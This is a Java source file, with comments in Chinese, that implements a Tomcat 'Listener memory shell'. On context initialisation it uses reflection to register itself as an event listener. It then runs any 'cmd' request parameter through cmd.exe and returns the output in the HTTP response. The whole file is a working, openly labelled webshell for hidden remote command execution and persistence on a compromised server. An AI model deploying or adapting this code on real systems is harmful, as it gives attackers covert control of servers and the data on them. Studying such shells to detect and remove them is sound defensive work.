import org.apache.catalina.connector.Request;
import org.apache.catalina.core.StandardContext;

import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.Scanner;

public class EvilListener implements ServletRequestListener, ServletContextListener {

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
        if (req.getParameter("cmd") != null) {
            InputStream in = null;
            try {
                // 执行命令
                in = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", req.getParameter("cmd")}).getInputStream();
                Scanner scanner = new Scanner(in, "GBK").useDelimiter("\\A");
                String output = scanner.hasNext() ? scanner.next() : "";

                // 通过反射获取 Request 对象
                Field requestF = req.getClass().getDeclaredField("request");
                requestF.setAccessible(true);
                Request request = (Request) requestF.get(req);

                // 发送命令执行的输出结果
                request.getResponse().setCharacterEncoding("GBK");
                PrintWriter writer = request.getResponse().getWriter();
                writer.write(output);
                writer.flush();
            } catch (Exception ignored) {}
        }
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        // 不需要实现
    }

    @Override
    public void contextInitialized(ServletContextEvent sce) {
        try {
            // 通过反射获取 StandardContext
            Field contextField = sce.getServletContext().getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            StandardContext standardContext = (StandardContext) contextField.get(sce.getServletContext());

            // 添加监听器
            standardContext.addApplicationEventListener(new EvilListener());
            System.out.println("[+] Inject Listener Memory Shell successfully!");
            System.out.println("[+] Shell URL: http://localhost:8080/test/?cmd=ipconfig");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void contextDestroyed(ServletContextEvent sce) {
        // 监听器销毁时执行（可以忽略）
    }
}
